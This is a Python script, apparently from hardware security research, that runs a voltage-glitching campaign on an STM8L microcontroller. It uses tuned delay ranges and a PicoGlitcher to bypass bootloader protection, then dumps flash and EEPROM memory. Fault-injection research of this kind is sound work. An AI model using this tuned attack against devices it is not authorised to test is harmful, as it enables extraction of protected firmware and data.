#!/usr/bin/env python3

import argparse
import itertools
import pathlib
import random
import subprocess
import sys
import time
from dotenv import load_dotenv
from binascii import hexlify
from findus import Database, PicoGlitcher
import pigpio

from findus.findus import BlockTimeoutError
from projects.stm8l.utils.pushover import send_pushover_notification
from .utils.psu import PS3005D
from .utils.reader import STM8Reader

RX_PIN = 27

import os, mmap, struct

# GPFSEL1 controls GPIO10..19. GPIO14 lives here.
GPFSEL1_OFFSET = 0x04
GPIO14_SHIFT = 3 * (14 - 10)  # 12
FSEL_MASK_3BITS = 0b111
FSEL_INPUT = 0b000
FSEL_ALT0 = 0b100  # UART0 TX on GPIO14


class Pin14Mux:
    __slots__ = ("fd", "mm", "mv", "_pack", "_unpack")

    def __init__(self):
        self.fd = os.open("/dev/gpiomem", os.O_RDWR | os.O_SYNC)
        self.mm = mmap.mmap(
            self.fd, 0x1000, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE
        )
        self.mv = memoryview(self.mm)
        st = struct.Struct("<I")
        self._pack, self._unpack = st.pack, st.unpack_from

    def close(self):
        self.mv.release()
        self.mm.close()
        os.close(self.fd)

    def _rw_gpfsel1(self):
        val = self._unpack(self.mv, GPFSEL1_OFFSET)[0]
        return val

    def enable_uart_tx_alt0(self):
        v = self._rw_gpfsel1()
        v &= ~(FSEL_MASK_3BITS << GPIO14_SHIFT)
        v |= FSEL_ALT0 << GPIO14_SHIFT
        self.mv[GPFSEL1_OFFSET : GPFSEL1_OFFSET + 4] = self._pack(v)

    def disable_to_input(self):
        v = self._rw_gpfsel1()
        v &= ~(FSEL_MASK_3BITS << GPIO14_SHIFT)  # set to INPUT (000)
        # (optional) leave as pure input; add pulls separately if you want.
        self.mv[GPFSEL1_OFFSET : GPFSEL1_OFFSET + 4] = self._pack(v)


def disable_tx():
    subprocess.run(["pinctrl", "set", "14", "ip", "pn"], check=True)


def enable_tx():
    subprocess.run(["pinctrl", "set", "14", "a0"], check=True)


class BootloaderProfilingGlitcher(PicoGlitcher):
    def init(self, *args, **kwargs):
        super().init(*args, **kwargs)

        self.pico_glitcher.pyb.exec_raw_no_follow(
            "import machine\n" f"adc = machine.ADC({RX_PIN})\n"
        )

    def read_success_flag(self) -> bool:
        out = self.pico_glitcher.pyb.exec_raw(f"print(int(adc.read_u16()))\n")

        print(out)
        return int(out[0].strip()) > 5000

    def classify(self, state: bytes) -> str:
        color = "C"
        if b"expected" in state:
            color = "G"
        elif b"timeout" in state:
            color = "Y"
        elif b"success" in state:
            color = "R"
        return color


class Main:
    def __init__(self, args):
        self.args = args
        self.parameters = {
            "length": 24,
            "voltage": 1.10,
            "delay1": [
                # range(28450, 28540),
                # range(28950, 29020),
                # range(29240, 29260),
                # range(29400, 29500),
                range(29460, 29520),  # very good
                # range(30200, 30270),
                # range(31950, 32020),
            ],
            "delay2": [
                range(34690, 34750),  # seems most promising
                range(35150, 35250),  # was range(35190, 35240), also very promising
                range(35680, 35730),
                range(36210, 36234),
                range(37200, 37250),
                range(37450, 37550),
            ],
        }

        if args.programmer:
            # self.mux = Pin14Mux()
            self.programmer = STM8Reader(port=args.programmer)

        self.glitcher = BootloaderProfilingGlitcher()
        self.glitcher.init(port=args.rpico, enable_vtarget=False)
        self.glitcher.change_config_and_reset("mux_vinit", "3.3")
        self.glitcher.init(port=args.rpico, enable_vtarget=False)

        self.glitcher.rising_edge_trigger()
        self.glitcher.set_multiplexing()

        self.glitcher.power_cycle_reset(0.01)

        self.db = Database(
            sys.argv + [f"{k}={v}" for k, v in self.parameters.items()],
            resume=args.resume,
            nostore=args.no_store,
            column_names=["voltage", "delay1", "delay2", "length"],
        )
        self.start_time = int(time.time())
        self.psu = PS3005D(port=args.psu)

    def run(self):
        exp_id = 0

        self.psu.set_voltage(self.parameters["voltage"])
        time.sleep(0.1)
        self.psu.set_current_limit(0.2)
        time.sleep(0.1)
        self.psu.turn_on()
        time.sleep(0.1)

        while True:
            length = self.parameters["length"]
            delay1_flattened = list(
                itertools.chain.from_iterable(self.parameters["delay1"])
            )
            delay1 = random.choice(delay1_flattened)
            delay2_flattened = list(
                itertools.chain.from_iterable(self.parameters["delay2"])
            )
            delay2 = random.choice(delay2_flattened)
            delay1 = round(delay1 / 4) * 4  # ensure delay is multiple of 4
            delay2 = round(delay2 / 4) * 4
            delay2 = delay2 - (
                delay1 + self.parameters["length"]
            )  # make delay2 relative

            mul_config = {
                "t1": length,
                "v1": "VI1",
                "t2": delay2,
                "v2": "3.3",
                "t3": length,
                "v3": "VI1",
            }
            self.glitcher.arm_multiplexing(delay1, mul_config)
            start_time = time.time()
            self.glitcher.reset(50e-6)  # reset for 50us
            success = False

            try:
                self.glitcher.block(timeout=1)
                time.sleep(100e-6)  # wait for rx to go high if success
                success = self.glitcher.read_success_flag()
                # self.mux.enable_uart_tx_alt0()

                if success:
                    if self.args.programmer:
                        # enable_tx()
                        time.sleep(0.9)
                        # print(
                        #     self.glitcher.pico_glitcher.pyb.exec_raw(
                        #         f"print(int(adc.read_u16()))\n"
                        #     )
                        # )
                        elapsed = time.time() - start_time
                        print(f"Enabling TX took {elapsed:.6f} seconds")
                        self.programmer.enter_bootloader()
                        flash = self.programmer.read_memory(0x8000, 0x2000)
                        eeprom = self.programmer.read_memory(0x1000, 0x00FF)
                        self.programmer.close()
                        print(hexlify(flash)[:16], "...")
                        print(hexlify(eeprom)[:16], "...")
                        # self.mux.disable_to_input()

                    # send_pushover_notification(
                    #     user_key=os.getenv("PUSHOVER_USER_KEY"),
                    #     app_token=os.getenv("PUSHOVER_APP_TOKEN"),
                    #     message=f"Successful glitch! with delays={delay1},{delay2} ns, length={length} ns, voltage={self.parameters['voltage']:.2f} V",
                    #     title="Successful glitch",
                    # )

                    if self.args.programmer:
                        break

                    state = b"success"
                else:
                    state = b"expected"
            except Exception as e:
                print(e)
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_reset(0.2)
                time.sleep(0.2)
                state = b"timeout"

            color = self.glitcher.classify(state)
            if success:
                self.db.insert(
                    exp_id,
                    self.parameters["voltage"] * 100,
                    delay1,
                    delay2,
                    length,
                    color,
                    state,
                )
            speed = self.glitcher.get_speed(self.start_time, exp_id)
            experiment_base_id = self.db.get_base_experiments_count()
            print(
                self.glitcher.colorize(
                    f"[+] Experiment {exp_id}\t{experiment_base_id}\t({speed})\t{self.parameters['voltage']:.2f}\t{delay1}\t{delay2}\t{length}\t{color}\t{state}",
                    color,
                )
            )
            exp_id += 1


if __name__ == "__main__":
    load_dotenv()

    p = argparse.ArgumentParser(
        description="STM8L single-glitch via external trigger + success pin"
    )
    p.add_argument(
        "--rpico",
        default="/dev/ttyACM0",
        required=True,
        help="PicoGlitcher serial port",
    )
    p.add_argument(
        "--psu", default="/dev/ttyACM1", required=True, help="PSU serial port"
    )
    p.add_argument(
        "--programmer",
        default="/dev/ttyAMA0",
        help="STM8 bootloader programmer serial port",
    )
    p.add_argument("--resume", action="store_true", help="Resume previous database run")
    p.add_argument(
        "--no-store", action="store_true", help="Do not write results to the database"
    )
    p.add_argument("--ic", required=True, help="IC number")
    args = p.parse_args()

    try:
        Main(args).run()
    except KeyboardInterrupt:
        print("Interrupted, exiting.")
        sys.exit(1)
